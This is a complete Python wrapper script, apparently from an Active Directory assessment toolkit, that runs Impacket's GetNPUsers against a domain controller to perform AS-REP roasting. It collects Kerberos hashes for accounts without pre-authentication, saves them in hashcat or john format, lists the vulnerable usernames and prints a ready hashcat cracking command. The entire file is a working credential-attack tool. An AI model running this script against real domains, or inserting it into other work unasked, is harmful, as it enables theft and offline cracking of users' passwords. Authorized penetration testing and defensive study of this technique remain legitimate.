#!/usr/bin/env python3
"""Run AS-REP roasting via Impacket and save AS-REP hashes.

Usage:
  python skills/adscan/scripts/asreproast.py -d corp.local --dc-ip 10.0.0.10 -u users.txt --format hashcat -o ./out
"""

from __future__ import annotations

import argparse
import json
import re
import shutil
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "shared" / "scripts"))


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="AS-REP roast wrapper for Impacket GetNPUsers."
    )
    parser.add_argument("-d", "--domain", required=True, help="Target domain")
    parser.add_argument("--dc-ip", required=True, help="Domain controller IP")
    users = parser.add_mutually_exclusive_group(required=True)
    users.add_argument("-u", "--users-file", help="File with usernames, one per line")
    users.add_argument("-U", "--user", help="Single username")
    parser.add_argument("--format", choices=["hashcat", "john"], default="hashcat")
    parser.add_argument("-o", "--output", required=True, help="Output directory")
    return parser.parse_args()


def pick_tool() -> str | None:
    return shutil.which("impacket-GetNPUsers") or shutil.which("GetNPUsers.py")


def build_command(args: argparse.Namespace, hash_path: Path) -> list[str]:
    cmd = [
        f"{args.domain}/",
        "-dc-ip",
        args.dc_ip,
        "-request",
        "-format",
        args.format,
        "-outputfile",
        str(hash_path),
    ]
    if args.users_file:
        cmd.extend(["-usersfile", args.users_file])
    else:
        cmd.extend(["-usersfile", "-"])
    return cmd


def vulnerable_users_from_output(text: str) -> list[str]:
    users: set[str] = set()
    for line in text.splitlines():
        if line.strip().startswith("$"):
            continue
        if "$krb5asrep$" in line:
            match = re.search(r"\$krb5asrep\$\d+\$(?:[^@]+@)?([^:]+)", line)
            if match:
                users.add(match.group(1))
    return sorted(users)


def main() -> int:
    args = parse_args()
    output_dir = Path(args.output).resolve()
    output_dir.mkdir(parents=True, exist_ok=True)

    hash_path = output_dir / f"asreproast_{args.domain}_{args.format}.txt"
    run_log = output_dir / "asreproast_stdout_stderr.txt"
    tool = pick_tool()
    cmd_tail = build_command(args, hash_path)

    payload: dict[str, object] = {
        "tool": tool or "impacket-GetNPUsers",
        "tool_found": bool(tool),
        "command": [tool or "impacket-GetNPUsers", *cmd_tail],
        "hash_file": str(hash_path),
        "vulnerable_users": [],
        "cracking_hint": f"hashcat -m 18200 {hash_path} <wordlist>"
        if args.format == "hashcat"
        else f"john --format=krb5asrep {hash_path}",
    }

    if not tool:
        print("[!] GetNPUsers tool not found. Printing command only.", file=sys.stderr)
        print(" ".join(payload["command"]))
        print(json.dumps(payload, indent=2, ensure_ascii=False))
        return 0

    full_cmd = [tool, *cmd_tail]
    if args.user:
        full_cmd[-2:] = []
        full_cmd.extend(["-usersfile", "-"])

    input_data = f"{args.user}\n" if args.user else None
    result = subprocess.run(
        full_cmd, input=input_data, capture_output=True, text=True, check=False
    )
    combined = f"{result.stdout}\n{result.stderr}".strip()
    run_log.write_text(combined + "\n", encoding="utf-8")

    payload["return_code"] = result.returncode
    payload["run_log"] = str(run_log)
    payload["hash_file_exists"] = hash_path.exists()
    payload["vulnerable_users"] = vulnerable_users_from_output(combined)
    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0 if result.returncode == 0 else result.returncode


if __name__ == "__main__":
    raise SystemExit(main())
